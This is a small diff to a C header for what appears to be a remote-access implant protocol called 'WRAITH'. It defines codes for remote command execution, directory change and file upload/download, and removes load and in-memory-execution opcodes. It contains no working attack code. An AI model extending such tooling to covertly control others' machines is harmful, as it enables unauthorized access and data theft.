@@ -22,14 +22,15 @@
 #define WRAITH_CMD_EXEC             0x01
 #define WRAITH_CMD_CHDIR            0x02
 #define WRAITH_CMD_PUT              0x03
-#define WRAITH_CMD_LOAD_GENERIC     0x04
-#define WRAITH_CMD_MEMEXEC            0x05
+#define WRAITH_CMD_GET              0x06
 
 #define WRAITH_MSG_ECHO             0x10
 #define WRAITH_MSG_CMD_SUCC         0x11
 #define WRAITH_MSG_CMD_FAIL         0x12
 #define WRAITH_MSG_PUT_SUCC         0x13
 #define WRAITH_MSG_PUT_FAIL         0x14
+#define WRAITH_MSG_GET_SUCC         0x15
+#define WRAITH_MSG_GET_FAIL         0x16
 
 typedef struct wraith_session wraith_session_t;
 
